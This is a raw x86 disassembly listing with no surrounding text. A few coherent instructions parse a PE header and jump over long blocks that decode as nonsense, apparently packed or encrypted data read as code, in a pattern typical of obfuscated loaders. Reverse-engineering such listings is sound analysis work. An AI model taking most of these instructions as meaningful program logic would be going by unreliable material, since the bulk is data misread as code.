  40ff8f:	mov    DWORD PTR ds:0x42fdd1,0x1793
  40ff99:	cmp    al,0xc3
  40ff9b:	jne    0x410b7f
  40ffa1:	mov    eax,DWORD PTR [ebp+0x8]
  40ffa4:	mov    edx,DWORD PTR ds:0x42fe76
  40ffaa:	and    edx,DWORD PTR ds:0x42e7fb
  40ffb0:	mov    DWORD PTR ds:0x42fe76,edx
  40ffb6:	mov    ecx,DWORD PTR [ebp+0x8]
  40ffb9:	mov    DWORD PTR ds:0x42e803,0x1299
  40ffc3:	add    ecx,DWORD PTR [eax+0x3c]
  40ffc6:	mov    edx,0x7510855
  40ffcb:	jmp    0x410395
  40ffd0:	fcmovnbe st,st(4)
  40ffd2:	aam    0xc8
  40ffd4:	repz enter 0xf3db,0x5c
  40ffd9:	push   edx
  40ffda:	jae    0x40fff5
  40ffdc:	and    DWORD PTR [ecx*2+0x70bd351f],ecx
  40ffe3:	jo     0x40ff88
  40ffe5:	jge    0x410057
  40ffe7:	jo     0x41002f
  40ffe9:	scas   eax,DWORD PTR es:[edi]
  40ffea:	into   
  40ffeb:	pushf  
  40ffec:	dec    edx
  40ffed:	sbb    eax,0xae2c4c9c
  40fff2:	imul   BYTE PTR [edi+0x7ce7e941]
  40fff8:	pop    ss
  40fff9:	sub    eax,DWORD PTR [eax-0x4a]
  40fffc:	imul   esp,ebx,0xb19555c3
  410002:	out    dx,eax
  410003:	adc    eax,0xfaf164be
  410008:	add    eax,0x282d9aac
  41000d:	bound  ebx,QWORD PTR [ecx+ebp*2-0x79]
  410011:	mov    al,ds:0x44791d97
  410016:	push   0xfc616a78
  41001b:	mov    bl,BYTE PTR [ebp+0x2903a3a1]
  410021:	int    0x90
  410023:	jg     0x40ffd7
  410025:	xor    eax,0x9ea67126
  41002a:	test   al,0x6f
  41002c:	mov    ebp,0x1b2a19fc
  410031:	fbld   TBYTE PTR [eax]
  410033:	cmp    edi,DWORD PTR [eax+0xe]
  410036:	iret   
  410037:	and    BYTE PTR [ebp+0x50bd03cf],dh
  41003d:	cmp    ah,BYTE PTR [ecx]
  41003f:	mov    es,WORD PTR [ecx-0x68433a25]
  410045:	mov    edi,0x50787424
  41004a:	xchg   esi,eax
  41004b:	outs   dx,BYTE PTR ds:[esi]
  41004c:	jp     0x41001c
  41004e:	fist   WORD PTR [eax+0x70]
  410051:	ds sbb al,0x9e
  410054:	aaa    
  410055:	adc    al,0xd
  410057:	rol    ch,1
  410059:	pusha  
  41005a:	out    dx,al
  41005b:	int3   
  41005c:	mov    BYTE PTR [edx],cl
  41005e:	cmp    al,0x5d
  410060:	in     al,dx
  410061:	popf   
  410062:	jmp    0x410045
  410064:	inc    esp
  410065:	cdq    
  410066:	addr16 loop 0x41004f
  410069:	jne    0x41007b
  41006b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41006c:	(bad)  
  41006d:	in     al,dx
  41006e:	sub    DWORD PTR [ebp+edi*8-0x24a61875],edi
  410075:	mov    dh,0xce
  410077:	jo     0x410067
  410079:	or     edx,DWORD PTR [ebx]
  41007b:	loopne 0x4100f1
  41007d:	sahf   
  41007e:	rcl    DWORD PTR [esi+ebx*1+0xe],0x4d
  410083:	jp     0x4100b4
  410085:	push   ss
  410086:	inc    edi
  410087:	and    ch,dh
  410089:	test   BYTE PTR [edi+0x24235284],0x6d
  410090:	sbb    edi,esp
  410092:	jecxz  0x41009a
  410094:	xchg   edi,eax
  410095:	dec    ecx
  410096:	or     DWORD PTR [edi],0x4d
  410099:	fdivr  DWORD PTR [ecx-0x95e4635]
  41009f:	pop    esi
  4100a0:	sub    al,0x84
  4100a2:	fs ins BYTE PTR es:[edi],dx
  4100a4:	shl    DWORD PTR [esp+ebp*8+0x6f],cl
  4100a8:	push   esi
  4100a9:	std    
  4100aa:	scas   al,BYTE PTR es:[edi]
  4100ab:	sub    eax,0x8c5cba40
  4100b0:	repz test al,0x70
  4100b3:	or     DWORD PTR [edi+0x56],edi
  4100b6:	addr16 lahf 
  4100b8:	fistp  QWORD PTR [eax+0x7488e879]
  4100be:	cwde   
  4100bf:	mov    eax,ds:0x4cb3990d
  4100c4:	sbb    DWORD PTR [ebx+ecx*8+0x6f1d63d5],edi
  4100cb:	add    BYTE PTR [ebx+0x5d],ah
  4100ce:	mov    edi,0xeea540c3
  4100d3:	sbb    ecx,DWORD PTR [ebx+0xc760dea]
  4100d9:	push   ecx
  4100da:	out    dx,eax
  4100db:	addr16 sub al,bh
  4100de:	aad    0xfa
  4100e0:	or     eax,edi
  4100e2:	and    edi,0x7e
  4100e5:	inc    eax
  4100e6:	nop
  4100e7:	push   0x11390185
  4100ec:	cmp    edx,ebx
  4100ee:	scas   al,BYTE PTR es:[edi]
  4100ef:	into   
  4100f0:	xlat   BYTE PTR ds:[ebx]
  4100f1:	sar    DWORD PTR [ebx-0x7d642f0a],1
  4100f7:	jnp    0x4100cd
  4100f9:	pop    ds
  4100fa:	add    DWORD PTR [ecx],ebx
  4100fc:	xchg   ecx,eax
  4100fd:	mov    bl,0x2a
  4100ff:	loop   0x4100da
  410101:	nop    DWORD PTR ds:0x5a4cd873
  410108:	dec    edx
  410109:	xor    esi,ecx
  41010b:	jle    0x41011c
  41010d:	stos   DWORD PTR es:[edi],eax
  41010e:	popf   
  41010f:	mov    esi,0xa8ac52a6
  410114:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410115:	sbb    dh,BYTE PTR [ebx-0x571bb717]
  41011b:	add    BYTE PTR [ebp+0x597bd64e],al
  410121:	add    cl,ah
  410123:	in     eax,dx
  410124:	and    al,0xf6
  410126:	mov    ss,WORD PTR [ebx+0x42ac8cc6]
  41012c:	pop    ebp
  41012d:	js     0x410193
  41012f:	(bad)
  410133:	push   edi
  410134:	dec    BYTE PTR [edx-0x5078be16]
  41013a:	adc    ebx,edi
  41013c:	jge    0x4100dd
  41013e:	or     al,0x4d
  410140:	(bad)  [eax+ecx*2+0x3d3acb8c]
  410147:	pop    esp
  410148:	mov    ds:0xdcb6c58,al
  41014d:	scas   eax,DWORD PTR es:[edi]
  41014e:	(bad)  [ebp+0x11]
  410151:	out    dx,eax
  410152:	(bad)  
  410154:	jno    0x4100f1
  410156:	sbb    ah,BYTE PTR [ecx+0x162672a1]
  41015c:	xchg   ebx,eax
  41015d:	pop    edi
  41015e:	mov    DWORD PTR [ecx],eax
  410160:	imul   ecx,DWORD PTR [edi],0x4d
  410163:	loop   0x41012e
  410165:	xor    bl,cl
  410167:	jmp    0x189:0x6bd09764
  41016e:	ins    BYTE PTR es:[edi],dx
  41016f:	arpl   bp,bx
  410171:	inc    edx
  410172:	pop    DWORD PTR [edx-0x26]
  410175:	inc    DWORD PTR [edi-0x5d2d3fbf]
  41017b:	sbb    DWORD PTR [esi],ebp
  41017d:	adc    ch,BYTE PTR [edi]
  41017f:	push   eax
  410180:	gs jge 0x4101fe
  410183:	jbe    0x410169
  410185:	leave  
  410186:	sbb    dl,BYTE PTR [ebx+0x7a]
  410189:	cwde   
  41018a:	test   BYTE PTR [ebp+esi*8+0x71],ah
  41018e:	xor    edx,esi
  410190:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410191:	mov    cl,0xe2
  410193:	in     eax,dx
  410194:	mov    al,ds:0x55b85845
  410199:	pop    ebp
  41019a:	fsubr  DWORD PTR [ebx-0x4a889a8a]
  4101a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101a1:	(bad)  
  4101a2:	xor    al,0x7e
  4101a4:	pusha  
  4101a5:	mov    dh,0x22
  4101a7:	mov    eax,ds:0xccfa1605
  4101ac:	aam    0xb9
  4101ae:	je     0x410176
  4101b0:	push   0x3e5b3ac2
  4101b5:	call   0x478bf7c2
  4101ba:	iret   
  4101bb:	ss fucom st(6)
  4101be:	and    ebx,edx
  4101c0:	mov    ch,0x99
  4101c2:	jb     0x4101e9
  4101c4:	jg     0x41019b
  4101c6:	mov    al,0x15
  4101c8:	mov    ah,BYTE PTR [ebx-0x2eda688d]
  4101ce:	xlat   BYTE PTR ds:[ebx]
  4101cf:	fwait
  4101d0:	push   es
  4101d1:	or     DWORD PTR [ebp+0x4b],eax
  4101d4:	push   ebx
  4101d5:	mov    bl,0x4a
  4101d7:	call   0xd7e9beb1
  4101dc:	sti    
  4101dd:	mov    ebx,0x998c72df
  4101e2:	sbb    al,0xfb
  4101e4:	pop    eax
  4101e5:	lahf   
  4101e6:	and    DWORD PTR [ebx],eax
  4101e8:	jmp    0x41023b
  4101ea:	in     eax,dx
  4101eb:	popa   
  4101ec:	lds    ecx,FWORD PTR [edi+esi*2+0xc]
  4101f0:	xor    cl,BYTE PTR [ebp-0x11d6a231]
  4101f6:	sti    
  4101f7:	ds jle 0x4101e3
  4101fa:	les    ecx,FWORD PTR [esi]
  4101fc:	xchg   esp,eax
  4101fd:	jne    0x410249
  4101ff:	out    dx,al
  410200:	iret   
  410201:	xor    eax,0x331c6a18
  410206:	pop    edi
  410207:	sbb    ch,dl
  410209:	push   ds
  41020a:	xchg   ebx,eax
  41020b:	bound  edx,QWORD PTR [edx-0x678b4bea]
  410211:	xchg   dl,dh
  410213:	sbb    al,0x32
  410215:	add    al,0x39
  410217:	push   0xffffffde
  410219:	loope  0x410299
  41021b:	fst    DWORD PTR [ecx-0x59]
  41021e:	dec    esi
  41021f:	push   edi
  410220:	adc    ch,BYTE PTR fs:[edx]
  410223:	pop    edi
  410224:	xchg   ebp,eax
  410225:	and    DWORD PTR [edx],ebp
  410227:	mov    eax,DWORD PTR [edi+eiz*4]
  41022a:	cwde   
  41022b:	pop    esi
  41022c:	mov    DWORD PTR [edx-0x11950d3a],edx
  410232:	aaa    
  410233:	xchg   esi,eax
  410234:	icebp  
  410235:	aaa    
  410236:	fs aam 0xb0
  410239:	mov    al,0x9a
  41023b:	jno    0x4102aa
  41023d:	mov    WORD PTR [esi+0x99b14e7],gs
  410243:	push   esi
  410244:	lds    ebp,FWORD PTR [eax-0x35e75dd7]
  41024a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41024b:	test   eax,0x12834a23
  410250:	xor    DWORD PTR [ecx-0x5d],0x842f7e02
  410257:	int3   
  410258:	jbe    0x41028a
  41025a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41025b:	jge    0x4102ca
  41025d:	sub    ch,BYTE PTR [edx-0x5]
  410260:	imul   edi,DWORD PTR [ecx-0x2bf2798f],0xffffffca
  410267:	sbb    BYTE PTR [eax-0x204aeae0],bh
  41026d:	sbb    BYTE PTR [edx],dl
  41026f:	inc    esp
  410270:	pusha  
  410271:	popa   
  410272:	add    dl,ch
  410274:	mov    ebp,0x53490fbd
  410279:	or     DWORD PTR [esi],0xb0e013c3
  41027f:	outs   dx,BYTE PTR ds:[esi]
  410280:	popa   
  410281:	cdq    
  410282:	pop    ss
  410283:	lahf   
  410284:	adc    DWORD PTR [ecx+0x3ba2b389],0x6e7a6e65
  41028e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41028f:	loopne 0x41028e
  410291:	test   BYTE PTR [esi-0x4a],cl
  410294:	mov    ch,0x7f
  410296:	sbb    ecx,ebp
  410298:	(bad)  
  410299:	jbe    0x4102a4
  41029b:	push   ebp
  41029c:	sti    
  41029d:	inc    ebx
  41029e:	iret   
  41029f:	pop    ebx
  4102a0:	int    0xab
  4102a2:	or     DWORD PTR [ebx],ebp
  4102a4:	sbb    DWORD PTR [ebx],ebp
  4102a6:	(bad)  
  4102a7:	cld    
  4102a8:	adc    al,BYTE PTR [edx]
  4102aa:	mov    cl,0x20
  4102ac:	dec    ecx
  4102ad:	sbb    bl,BYTE PTR [ecx+0x64]
  4102b0:	sar    BYTE PTR [ecx],0x20
  4102b3:	ja     0x41030a
  4102b5:	daa    
  4102b6:	retf   
  4102b7:	inc    eax
  4102b8:	xor    bl,BYTE PTR [edi-0x12]
  4102bb:	cs in  eax,dx
  4102bd:	cmp    edx,DWORD PTR [eax+eax*8]
  4102c0:	cdq    
  4102c1:	cmp    dl,BYTE PTR [esi]
  4102c3:	in     al,0x61
  4102c5:	mov    dl,0x7f
  4102c7:	mov    al,0xbe
  4102c9:	add    al,0x93
  4102cb:	std    
  4102cc:	and    ah,ch
  4102ce:	outs   dx,BYTE PTR ds:[esi]
  4102cf:	test   al,0xc9
  4102d1:	pop    edi
  4102d2:	es ret 0xd943
  4102d6:	std    
  4102d7:	pop    edx
  4102d8:	push   cs
  4102d9:	hlt    
  4102da:	fiadd  DWORD PTR [ebp-0x74b3a84f]
  4102e0:	lods   al,BYTE PTR ds:[esi]
  4102e1:	ret    
  4102e2:	adc    BYTE PTR [eax+0x22],bl
  4102e5:	aad    0x87
  4102e7:	out    0x1,eax
  4102e9:	xrelease mov DWORD PTR [edx],ebx
  4102ec:	xchg   edi,eax
  4102ed:	sub    al,0x97
  4102ef:	jmp    DWORD PTR ds:0x33adfffb
  4102f5:	outs   dx,BYTE PTR ds:[esi]
  4102f6:	mov    esi,0xf38596dd
  4102fb:	rcl    DWORD PTR [eax],1
  4102fd:	jno    0x41032f
  4102ff:	push   ss
  410300:	call   0x814:0x2b69d5e6
  410307:	aad    0x65
  410309:	mov    edi,0x80557a3d
  41030e:	or     al,ch
  410310:	aaa    
  410311:	fstp   TBYTE PTR [ebx-0x2e6fa51c]
  410317:	pop    esp
  410318:	dec    eax
  410319:	sahf   
  41031a:	(bad)  
  41031c:	ja     0x410305
  41031e:	mov    edi,0x631787c0
  410323:	outs   dx,BYTE PTR ds:[esi]
  410324:	push   ds
  410325:	lock test DWORD PTR [eax-0x73],0x382d3483
  41032d:	scas   al,BYTE PTR es:[edi]
  41032e:	dec    esp
  41032f:	iret   
  410330:	fisttp WORD PTR ds:0x51a67f05
  410336:	sub    dh,0xba
  410339:	push   ebx
  41033a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41033b:	mov    cl,0x46
  41033d:	sahf   
  41033e:	lea    edx,[ecx+ebp*4-0x3aab8814]
  410345:	aam    0x42
  410347:	ror    DWORD PTR [ebx],1
  410349:	mov    ds,WORD PTR [ebx+0x62b638bf]
  41034f:	std    
  410350:	push   ebx
  410352:	push   ecx
  410353:	cmp    cl,BYTE PTR [edi-0x54ec7d65]
  410359:	mov    esi,0xadb3716f
  41035e:	xor    ecx,DWORD PTR [ecx-0x2f]
  410361:	and    ecx,DWORD PTR [eax]
  410363:	push   0xf69d581e
  410368:	out    0xf5,al
  41036a:	and    BYTE PTR [ebp-0x6ff5bc3],bl
  410370:	mov    bl,0x82
  410372:	arpl   WORD PTR [edi],bp
  410374:	jmp    0xe7b11347
  410379:	fsubr  QWORD PTR cs:[ebx+0x473b8e]
  410380:	push   esi
  410381:	fs ja  0x410332
  410384:	sbb    BYTE PTR [edi+0x62],bh
  410387:	push   ebp
  410388:	add    al,BYTE PTR ds:0x7fe5feab
  41038e:	and    eax,0xcd15571d
  410393:	fwait
  410394:	mov    bh,0x89
  410396:	dec    ebp
  410397:	or     BYTE PTR ds:0x2082,al
  41039d:	mov    eax,DWORD PTR [ebp-0x4]
  4103a0:	mov    ecx,DWORD PTR ds:0x42fe05
  4103a6:	add    ecx,DWORD PTR ds:0x42fe09
  4103ac:	mov    DWORD PTR ds:0x42fe05,ecx
  4103b2:	xor    eax,edx
  4103b4:	sub    DWORD PTR ds:0x42e21c,ebx
  4103ba:	push   esi
  4103bb:	sbb    ecx,ecx
  4103bd:	jmp    0x410787
  4103c2:	lods   al,BYTE PTR ds:[esi]
  4103c3:	das    
  4103c4:	mov    ds:0xaa91a114,al
  4103c9:	mov    bh,0x91
  4103cb:	call   0x6744:0xd18ebab6
  4103d2:	pop    eax
  4103d3:	mov    edx,0x7da37070
  4103d8:	jo     0x41044a
  4103da:	fsubr  QWORD PTR [esi]
  4103dc:	sub    bl,dh
  4103de:	shr    DWORD PTR [esi-0x5],1
  4103e1:	test   bl,cl
  4103e3:	in     al,dx
  4103e4:	mov    edi,0x4deba73d
  4103e9:	xchg   esp,eax
  4103ea:	cmp    al,0x43
  4103ec:	popf   
  4103ed:	jne    0x4103c3
  4103ef:	es sbb al,0x39
  4103f2:	aaa    
  4103f3:	inc    edx
  4103f4:	ror    DWORD PTR [edi+0x65dbc58d],0x64
  4103fb:	bound  eax,QWORD PTR [ecx+0x7f2c6b71]
  410401:	(bad)  
  410403:	inc    ebp
  410404:	adc    esp,DWORD PTR [esi-0x1a1aa79c]
  41040a:	aam    0x65
  41040c:	pusha  
  41040d:	mov    WORD PTR [edx-0x28],gs
  410410:	retf   
  410411:	jle    0x41045f
  410413:	int3   
  410414:	cmp    DWORD PTR [eax+0x10],ecx
  410417:	sti    
  410418:	sbb    al,0xee
  41041a:	jno    0x41043d
  41041c:	in     al,dx
  41041d:	mov    ds:0xd165bca5,al
  410422:	sub    al,0xe2
  410424:	xor    al,0x67
  410426:	sbb    DWORD PTR [edi],0xffffffd1
  410429:	push   cs
  41042a:	ins    DWORD PTR es:[edi],dx
  41042b:	and    eax,0xa8f7847
  410430:	dec    ecx
  410431:	dec    ecx
  410432:	out    dx,eax
  410433:	xor    eax,0xaf0f759f
  410438:	popa   
  410439:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41043a:	or     BYTE PTR ds:0xa9c329d7,al
  410440:	pop    ss
  410441:	loop   0x410406
  410443:	jns    0x4103db
  410445:	add    BYTE PTR [edi+0x50],ah
  410448:	fisub  DWORD PTR [ebx-0x7b4fc5c9]
  41044e:	call   0xdc4b:0x7e795b6f
  410455:	mov    BYTE PTR [edx+eax*8],ah
  410458:	mov    bh,0x12
  41045a:	or     BYTE PTR [esi],dl
  41045c:	or     al,0x17
  41045e:	xchg   esi,eax
  41045f:	jmp    0xf058:0xb399f726
  410466:	out    dx,eax
  410467:	iret   
  410468:	push   ebx
  410469:	pop    edi
  41046a:	push   edx
  41046b:	out    0x6,eax
  41046d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41046e:	push   edi
  41046f:	pop    edi
  410470:	and    bh,ch
  410472:	cs mov edx,esi
  410475:	pop    esi
  410476:	push   esi
  410477:	or     eax,DWORD PTR [esp+ebx*8]
  41047a:	jmp    0x95100aa6
  41047f:	jo     0x4104b5
  410481:	cmp    bh,BYTE PTR [ebx-0x79]
  410484:	pop    es
  410485:	xchg   edi,eax
  410486:	push   eax
  410487:	xchg   BYTE PTR [esi+0x6b],dh
  41048a:	pop    esi
  41048b:	rcr    esp,0xe7
  41048e:	es sbb al,0x84
  410491:	shl    BYTE PTR [eax],cl
  410493:	shl    DWORD PTR [eax+0x63efd6b0],1
  410499:	mov    esi,0x88398175
  41049e:	and    eax,0x215f319
  4104a3:	sbb    al,dl
  4104a5:	nop
  4104a6:	enter  0x7773,0x4f
  4104aa:	dec    edi
  4104ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104ac:	imul   ecx,DWORD PTR [ebp-0x41],0x3f3334bd
  4104b3:	out    0xdd,eax
  4104b5:	(bad)  
  4104b6:	(bad)  
  4104b8:	lahf   
  4104b9:	idiv   esi
  4104bb:	adc    eax,0x1075db41
  4104c0:	fadd   DWORD PTR [ecx]
  4104c2:	jle    0x4104a8
  4104c4:	xchg   BYTE PTR [esi+0x35],dh
  4104c7:	test   al,0xf3
  4104c9:	fdivrp st(2),st
  4104cb:	xor    BYTE PTR [esi],0xac
  4104ce:	xor    BYTE PTR ds:0x8ef8f353,0xff
  4104d5:	sbb    BYTE PTR [ebp+0x1e54cd8f],ah
  4104db:	cwde   
  4104dc:	xchg   DWORD PTR [esi],esi
  4104de:	xchg   edx,eax
  4104df:	sub    eax,0x10d92d5e
  4104e4:	or     esp,DWORD PTR [edi+0xb]
  4104e7:	jnp    0x410566
  4104e9:	ins    BYTE PTR es:[edi],dx
  4104ea:	jmp    0x1146:0x74d25c7c
  4104f1:	mov    al,0x32
  4104f3:	rcr    DWORD PTR [edi+ebx*8+0x35715d48],0x7c
  4104fb:	mov    ss,WORD PTR ds:0xb48bcfe4
  410501:	dec    edx
  410502:	push   0xfed38ac
  410507:	sahf   
  410508:	ins    BYTE PTR es:[edi],dx
  410509:	sahf   
  41050a:	in     eax,dx
  41050b:	pop    ebx
  41050c:	push   ds
  41050d:	cmp    cl,BYTE PTR [ecx]
  41050f:	mov    eax,0xd84686e3
  410514:	push   ebx
  410515:	push   ebx
  410516:	cli    
  410517:	sti    
  410518:	or     al,0xfc
  41051a:	inc    edx
  41051b:	repnz inc ebx
  41051d:	out    dx,al
  41051e:	(bad)  
  41051f:	push   edi
  410520:	fcmovnb st,st(0)
  410522:	adc    cl,0xd4
  410525:	fsubr  DWORD PTR [eax+0x2628f65f]
  41052b:	jno    0x410583
  41052d:	mov    WORD PTR [edx-0x24],es
  410530:	push   0x19
  410532:	(bad)  
  410534:	ja     0x4104c6
  410536:	scas   eax,DWORD PTR es:[edi]
  410537:	mov    ds:0x98c4076d,al
  41053c:	ja     0x41056a
  41053e:	jp     0x410514
  410540:	mov    ch,0xfc
  410542:	js     0x41056c
  410544:	mov    eax,ds:0xa6b18813
  410549:	sub    DWORD PTR [ebx+ecx*1-0x6c],edi
  41054d:	and    BYTE PTR ds:0xfaf9e902,0xfe
  410554:	sbb    DWORD PTR [eax-0x65],edx
  410557:	push   esp
  410558:	jmp    0xa1e7:0xbbccdba0
  41055f:	fnstcw WORD PTR [edx-0x57]
  410562:	aam    0x76
  410564:	cmp    eax,0xbe3fac56
  410569:	mov    WORD PTR [esi+0x48c638d],fs
  41056f:	pop    ds
  410570:	or     dh,dl
  410572:	ins    BYTE PTR es:[edi],dx
  410573:	test   DWORD PTR [ecx],0xb8df6fde
  410579:	dec    edi
  41057a:	adc    ebx,DWORD PTR [eax+0x23]
  41057d:	pop    ecx
  41057e:	xlat   BYTE PTR ds:[ebx]
  41057f:	fadd   DWORD PTR [ecx]
  410581:	lahf   
  410582:	mov    ebp,0x25a9fdf2
  410587:	adc    edx,DWORD PTR [edx+0x5ff46085]
  41058d:	fwait
  41058e:	sbb    DWORD PTR ds:0x7ed4e5d9,esi
  410594:	btc    DWORD PTR [edi],esp
  410597:	ds test al,0x1b
  41059a:	cwde   
  41059b:	imul   ebp,DWORD PTR [ecx+0x5b],0x78
  41059f:	int3   
  4105a0:	mov    bl,0x3c
  4105a2:	hlt    
  4105a3:	cmp    BYTE PTR [ebx-0x46],0x8f
  4105a7:	in     al,dx
  4105a8:	inc    ecx
  4105a9:	xor    cl,bh
  4105ab:	in     eax,dx
  4105ac:	cli    
  4105ad:	and    dh,ah
  4105af:	dec    edx
  4105b0:	dec    ecx
  4105b1:	push   ebp
  4105b2:	repz jns 0x41058a
  4105b5:	call   0xdd72:0xf95527e5
  4105bc:	lock mov ebp,0x1787d83
  4105c2:	aad    0x49
  4105c4:	xchg   BYTE PTR [ebx+0x51f0cc97],al
  4105ca:	lahf   
  4105cb:	stos   BYTE PTR es:[edi],al
  4105cc:	outs   dx,DWORD PTR ds:[esi]
  4105cd:	xchg   esp,eax
  4105ce:	out    dx,al
  4105cf:	mov    dl,0xd4
  4105d1:	fadd   QWORD PTR [ebp+0x6eb25d93]
  4105d7:	dec    edi
  4105d8:	in     al,0xe2
  4105da:	in     al,dx
  4105db:	mov    dl,0x3c
  4105dd:	fist   WORD PTR [edi]
  4105df:	lock sub ah,BYTE PTR [eax+0x2a]
  4105e3:	xchg   edi,eax
  4105e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105e5:	dec    esi
  4105e6:	mov    ch,BYTE PTR [eax]
  4105e8:	cmp    edx,esp
  4105ea:	add    al,0x5d
  4105ec:	outs   dx,BYTE PTR ds:[esi]
  4105ed:	mov    al,ds:0x2788feb
  4105f2:	cmp    DWORD PTR [eax+0x2a],0x4d
  4105f6:	bound  edi,QWORD PTR [ecx]
  4105f8:	in     al,0x5f
  4105fa:	mov    al,0x9b
  4105fc:	adc    al,0x2e
  4105fe:	inc    edx
  4105ff:	fild   QWORD PTR [edi+eax*4-0x63]
  410603:	pop    edi
  410604:	pop    edi
  410605:	sbb    al,0xb8
  410607:	scas   eax,DWORD PTR es:[edi]
  410608:	imul   ecx,ebp,0x33f11b73
  41060e:	sub    DWORD PTR [edi+0x6a0030c0],esi
  410614:	sahf   
  410615:	push   esi
  410616:	jl     0x410660
  410618:	ficom  WORD PTR [edi+0x7d]
  41061b:	js     0x410670
  41061d:	pop    ebp
  41061e:	sbb    DWORD PTR [edi],ebp
  410620:	inc    esp
  410621:	inc    edx
  410622:	sub    DWORD PTR [ebx-0x62],esi
  410625:	add    bh,BYTE PTR [edi+edx*8-0x479ef6fd]
  41062c:	xchg   ecx,eax
  41062d:	xchg   ebx,eax
  41062e:	cli    
  41062f:	add    eax,0xe61603c1
  410634:	je     0x4105f2
  410636:	mov    ch,0x5e
  410638:	scas   eax,DWORD PTR es:[edi]
  410639:	aaa    
  41063a:	cwde   
  41063b:	mov    BYTE PTR [edi-0x13],bh
  41063e:	cmp    ebp,DWORD PTR [edi]
  410640:	jbe    0x410609
  410642:	xchg   BYTE PTR [edx],dl
  410644:	adc    DWORD PTR [esi],ebp
  410646:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410647:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410648:	rcr    ecx,1
  41064a:	push   cs
  41064b:	das    
  41064c:	mov    al,0xc0
  41064e:	add    eax,0x8aec3cf4
  410653:	es mov al,0x94
  410656:	dec    ecx
  410657:	adc    ebx,esi
  410659:	das    
  41065a:	sar    DWORD PTR [esi-0x61],1
  41065d:	xchg   edx,eax
  41065e:	mov    dh,0x1d
  410660:	hlt    
  410661:	test   al,0x7
  410663:	pop    ds
  410664:	cmp    BYTE PTR [edx+eax*4],cl
  410667:	outs   dx,DWORD PTR ds:[esi]
  410668:	jmp    0x961dff55
  41066d:	dec    esi
  41066e:	lods   eax,DWORD PTR ds:[esi]
  41066f:	lock (bad) 
  410671:	das    
  410672:	push   0xa26e999a
  410677:	arpl   WORD PTR [bp+si],si
  41067a:	xor    ebp,DWORD PTR [eax+eiz*8-0x703bb4ed]
  410681:	and    eax,0xeb4a901f
  410687:	xor    ebx,DWORD PTR [edx-0x5e]
  41068a:	mov    ds:0xa7fd24f0,al
  41068f:	lods   eax,DWORD PTR ds:[esi]
  410690:	xchg   edx,eax
  410691:	loope  0x4106d8
  410693:	lods   eax,DWORD PTR ds:[esi]
  410694:	popf   
  410695:	cld    
  410696:	inc    ebx
  410697:	int    0x41
  410699:	mov    esi,0xaa91ab45
  41069e:	shl    DWORD PTR [esi+ebp*8+0x51dfdd14],0xbd
  4106a6:	sub    eax,0x292e1ef2
  4106ab:	or     eax,0x8bd54a86
  4106b0:	jo     0x4106fd
  4106b2:	jecxz  0x4106b2
  4106b4:	bound  edi,QWORD PTR [edx]
  4106b6:	pop    esp
  4106b7:	and    DWORD PTR [ebp+0x75],0x29
  4106bb:	jbe    0x410647
  4106bd:	mov    dl,0x6f
  4106bf:	rcl    DWORD PTR [ebp-0x4a],cl
  4106c2:	dec    esi
  4106c3:	lahf   
  4106c4:	mov    bl,0xd9
  4106c6:	jns    0x41072c
  4106c8:	in     eax,dx
  4106c9:	ror    DWORD PTR [ebp-0x21],cl
  4106cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106cd:	jg     0x4106ac
  4106cf:	add    al,BYTE PTR [esi-0x70]
  4106d2:	iret   
  4106d3:	add    ebp,DWORD PTR [ebx+ebp*8-0x33]
  4106d7:	mov    edi,0xa42114fd
  4106dc:	scas   eax,DWORD PTR es:[edi]
  4106dd:	cmp    al,0xf0
  4106df:	(bad)
  4106e2:	dec    esp
  4106e3:	adc    eax,0x2fab5d22
  4106e8:	int3   
  4106e9:	ins    BYTE PTR es:[edi],dx
  4106ea:	js     0x4106de
  4106ec:	cdq    
  4106ed:	adc    eax,0x4438c9f6
  4106f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106f3:	bound  edi,QWORD PTR ds:0xb2f6300c
  4106f9:	push   ss
  4106fa:	fwait
  4106fb:	sbb    eax,0x7e8c39a9
  410700:	inc    ecx
  410701:	test   al,0xeb
  410703:	aam    0xac
  410705:	cs mov edi,0xe74de3d5
  41070b:	jno    0x4106fa
  41070d:	int3   
  41070e:	dec    ecx
  41070f:	mov    esp,0x1fb317ff
  410714:	mov    esp,0x20bc6c2f
  410719:	adc    dl,dl
  41071b:	imul   eax,DWORD PTR [eax],0xfffffff9
  41071e:	mov    ebx,DWORD PTR [esi-0x4c432e11]
  410724:	sahf   
  410725:	loopne 0x41076e
  410727:	mov    ds,WORD PTR [ebp-0x30]
  41072a:	sbb    eax,0x7962ac4a
  41072f:	call   0x110154e1
  410734:	cmp    BYTE PTR [ebx+0x4cddc057],cl
  41073a:	inc    esp
  41073b:	or     al,0xcf
  41073d:	inc    esi
  41073e:	icebp  
  41073f:	adc    cl,al
  410741:	add    bh,ch
  410743:	add    DWORD PTR [esp+ebx*1],eax
  410746:	idiv   BYTE PTR [eax+ebp*4-0x3d86a3ad]
  41074d:	fs repz (bad) 
  410750:	jl     0x410722
  410752:	pop    esp
  410753:	sbb    eax,DWORD PTR [ebp+0xd]
  410756:	fmul   DWORD PTR [edx]
  410758:	in     al,0x9b
  41075a:	adc    eax,0xe8b4618
  41075f:	test   eax,0xd1cca644
  410764:	jns    0x4107d2
  410766:	sti    
  410767:	fisub  DWORD PTR [edi+0x21e04db3]
  41076d:	gs gs mov al,0x74
  410771:	popa   
  410772:	ret    0xb459
  410775:	dec    edx
  410776:	lahf   
  410777:	test   eax,0xe53b3955
  41077c:	dec    esp
  41077d:	jecxz  0x4107a1
  41077f:	xchg   edi,eax
  410780:	fwait
